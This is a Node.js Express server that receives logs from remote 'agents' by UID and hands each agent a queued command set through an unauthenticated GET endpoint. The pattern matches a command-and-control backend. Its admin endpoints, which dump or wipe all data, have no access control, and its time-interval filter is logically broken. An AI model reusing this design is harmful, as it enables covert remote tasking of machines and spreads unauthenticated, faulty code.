require('dotenv').config(); 
const express = require('express');
const fs = require('fs');
const path = require('path');
const moment = require('moment'); // To handle time intervals

const app = express();

// Middleware to parse JSON
app.use(express.json());

// Store logs and commands for each UID
let userLogs = {};  // Object to store logs per UID
let userCommands = {};  // Object to store commands per UID

// Helper function to get logs within a time interval
function getLogsWithinInterval(logs, interval) {
    const now = moment();  // Current time
    return logs.filter(log => {
        const logTime = moment(log.timestamp);  // Timestamp from the log
        const diff = now.diff(logTime, interval);  // Difference in time units
        return diff <= 0;  // Return logs that are within the specified time range
    });
}

// Endpoint to receive logs from the agent and store them (works for both GET and POST)
app.all('/logs/:uid', (req, res) => {
    const uid = req.params.uid;
    const { log, timestamp } = req.query; // Using query params

    // If no log or timestamp is sent, return an error
    if (!log || !timestamp) {
        return res.status(400).json({ status: 'error', message: 'Log and timestamp are required' });
    }

    const userLog = {
        timestamp: timestamp,
        log: log,
        cmd: userCommands[uid] || 'N/A'
    };

    // Store the log for this UID
    if (!userLogs[uid]) {
        userLogs[uid] = [];
    }
    userLogs[uid].push(userLog);

    // Respond with success and the stored command
    res.json({
        status: 'success',
        message: 'Log stored successfully',
        cmd: userCommands[uid] || 'N/A', // Include the stored command in the response
    });
});

// Endpoint to set or update the command for a specific UID (GET request)
app.get('/logs/execute/:uid', (req, res) => {
    const uid = req.params.uid;
    const { cmd, time } = req.query;  // Accessing 'cmd' and 'time' from query string

    if (!cmd) {
        return res.status(400).json({ status: 'error', message: 'Command is required' });
    }

    // Handle the "time" parameter
    if (time === '1') {
        // If time is "1", show the command once and then reset
        userCommands[uid] = cmd;

        // Respond with the command and reset for future requests
        return res.json({
            status: 'success',
            message: `Command set successfully for UID: ${uid}`,
            cmd: cmd,
        });
    } else {
        // If time is not "1", we don't show the command again
        return res.json({
            status: 'success',
            message: `Command set for UID: ${uid}`,
            cmd: userCommands[uid] || 'N/A',
        });
    }
});

// Endpoint to get logs for a specific UID (GET request)
app.get('/logs/:uid', (req, res) => {
    const uid = req.params.uid;

    if (!userLogs[uid] || userLogs[uid].length === 0) {
        return res.status(404).json({ status: 'error', message: 'No logs found for this UID' });
    }

    // Respond with the logs for the specified UID
    res.json({
        status: 'success',
        logs: {
            [uid]: userLogs[uid],
        },
        cmd: userCommands[uid] || 'N/A', // Include the stored command for that UID
    });
});

// Endpoint to query logs for a specific UID (GET request)
app.get('/query/:uid', (req, res) => {
    const uid = req.params.uid;

    // Check if there are logs for the given UID
    if (!userLogs[uid] || userLogs[uid].length === 0) {
        return res.status(404).json({ status: 'error', message: 'No logs found for this UID' });
    }

    // Respond with the logs for the specified UID in the same format as the admin endpoint
    res.json({
        status: 'success',
        logs: {
            [uid]: userLogs[uid],  // Ensure logs are returned for the UID
        },
        cmd: userCommands[uid] || 'N/A', // Include the stored command for that UID
    });
      });
// Endpoint to query raw logs for a specific UID with interval (e.g., 1h, 30m)
app.get('/query/raw/:uid', (req, res) => {
    const uid = req.params.uid;
    const { interval } = req.query;

    // Check if there are logs for the given UID
    if (!userLogs[uid] || userLogs[uid].length === 0) {
        return res.status(404).json({ status: 'error', message: 'No logs found for this UID' });
    }

    // If no interval is provided, return all logs for the UID in raw format
    let filteredLogs = userLogs[uid];

    // If interval is provided, validate and filter logs by time
    if (interval) {
        // Validate the interval format (e.g., "1h", "30m", "1min")
        if (!/^\d+[hm]$/.test(interval)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid interval format. Use "1h", "30m", or "1min".',
            });
        }

        // Convert the interval to the appropriate unit for moment.js (e.g., 'hours', 'minutes')
        const validIntervals = {
            'h': 'hours',
            'm': 'minutes',
        };
        const unit = validIntervals[interval.slice(-1)];

        // Filter logs based on the interval
        filteredLogs = getLogsWithinInterval(userLogs[uid], unit);

        // If no logs match the interval, return a message
        if (filteredLogs.length === 0) {
            return res.status(200).send('No logs found for the specified interval');
        }
    }

    // Respond with raw logs (just the log message with timestamps)
    const rawLogs = filteredLogs.map(log => `[${log.timestamp}] ${log.log}`).join('\n');
    res.send(rawLogs);
});

// Admin endpoint to view all logs for all users
app.get('/admin/logs/all', (req, res) => {
    res.json({
        status: 'success',
        message: 'All logs fetched successfully',
        data: userLogs,
    });
});

// Admin endpoint to clear all logs and commands for all users
app.get('/admin/clear', (req, res) => {
    userLogs = {};
    userCommands = {};
    res.json({
        status: 'success',
        message: 'All logs and commands cleared',
    });
});

// Start the server
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
